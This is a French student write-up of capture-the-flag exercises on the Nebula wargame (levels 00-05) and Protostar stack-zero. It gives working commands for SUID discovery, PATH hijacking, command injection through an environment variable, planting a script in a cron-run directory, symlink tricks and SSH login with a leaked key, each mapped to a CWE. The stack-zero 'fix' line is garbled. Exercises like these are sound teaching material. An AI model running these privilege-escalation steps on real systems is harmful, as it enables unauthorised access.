# tp1_secu

**Level00**
Nous devons donc traquer un programme en Set User ID. Pour cela, nous utilisons la commande find suivante :
level00@nebula:/bin/...$ find / -user flag00 2>/dev/null 

Parmi les occurrences trouvées, nous avons ceci :
/bin/.../flag00

Le chemin contenant ... est suspect et est utilisé ici pour cacher l’exécutable flag00.

Le programme change le UID effectif et permet d'exécuter un programme pour lequel on devrait pas avoir la permission (getflag)

La faiblesse est la présence d'un programme SUID non protégé.

CWE250:
The product performs an operation at a privilege level that is higher than the minimum level required, which creates new weaknesses or amplifies the consequences of other weaknesses.


**Level01**

Le programme appartient à l’utilisateur flag01 et est exécuté avec son UID effectif.
En analysant le code source, on remarque l’appel suivant :
system("/usr/bin/env echo and now what?");

Le programme utilise donc /usr/bin/env pour appeler echo, ce qui signifie que la résolution de la commande dépend de la variable d’environnement PATH (merci le hint).

Nous exploitons alors le fait que echo n’est pas appelé avec un chemin absolu, ce qui permet d’en fournir un autre via le PATH.
Nous créeons alors un symlink se nommant echo qui va pointé vers getflag:
level01@nebula:/tmp$ ln -s /bin/getflag /tmp/echo 

Ce lien permet de faire croire au programme qu’il exécute echo, alors qu’il exécute en réalité getflag, tout en conservant l’UID et le GID de flag01.

La dernière étape est de modifier la variable PATH afin que /tmp soit recherché en priorité  

level01@nebula:/tmp$ export PATH=/tmp:$PATH on rajoute tmp dans le path pour que echo ait accès à notre redirection.

La faiblesse est la fonction system() qui n'est pas indépendante du path et qui donc nous permet de lui faire exectuer ce qu'on veut

CWE-426:
The product searches for critical resources using an externally-supplied search path that can point to resources that are not under the product's direct control.

**Level02**

En analysant le code source, on remarque que la variable d’environnement USER est récupérée et directement intégrée dans une commande passée à system()

asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
system(buffer);

Nous pouvons alors faire ce que nous voulons avec la variable d'environnement USER. Nous injectons donc une commande "complétement aléatoire" avec ceci:
export USER='$(/bin/getflag)'
Ce qui récupère notre flag car le programme appartient à flag02.

La faiblesse ici est encore due à l'injection de paramètre dans  la fonction system() mais cette fois via une variable d'environnement.

CWE-77:
The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component.

**Level03**

drwxrwxrwx 2 flag03 flag03  3 2012-08-18 05:24 writable.d
Le cron appartient à flag03 donc tout ce qui est executé par lui à les droits de flag03.

on crée le fichier malveillant: echo "/bin/getflag" > malveillance_max.sh
il faut rediriger la sortie pour être sur que la sortie soit pas envoyé par mail ou quoi.
level03@nebula:/home/flag03/writable.d$ echo -e '#!/bin/bash\n/bin/getflag > /tmp/flag03.txt 2>&1' > malveillance_max.sh

**Level04**
/home/flag04$ ln -s /home/flag04/token /tmp/lien_pas_suspect crée le faux lien ne contenant pas le mot token
06508b5e-8909-4f38-b630-fdb148a848a2 est le token de flag04
en se connectant sur flag04 on peut alors rensigner le mdp
sh-4.2$ id uid=995(flag04) gid=995(flag04) groups=995(flag04) on est bien flag04 et donc on peut executer getflag

**Level05**
Un fichier caché backup est présent:
level05@nebula:/home/flag05$ ls -a
.  ..  .backup  .bash_logout  .bashrc  .profile  .ssh
Il y'a une archive dedans
level05@nebula:/home/flag05/.backup$ ls
backup-19072011.tgz
qui contient plusieurs fichier dont le plus important 
id_rsa dans .ssh qui permet de se connecter en ssh
level05@nebula:/tmp$ ssh -i /tmp/.ssh/id_rsa flag05@localhost

et donc avoir le bon id pour effectuer getflag
flag05@nebula:/home$ id
uid=994(flag05) gid=994(flag05) groups=994(flag05)
flag05@nebula:/home$ getflag
You have successfully executed getflag on a target account


# tp2_secu

**stack-zero**
solution:rouler sa tête sur le clavier
fix: if(sizeof(buffer)>64)local.changeme=0;

print("A"*64 + 'IlYb')


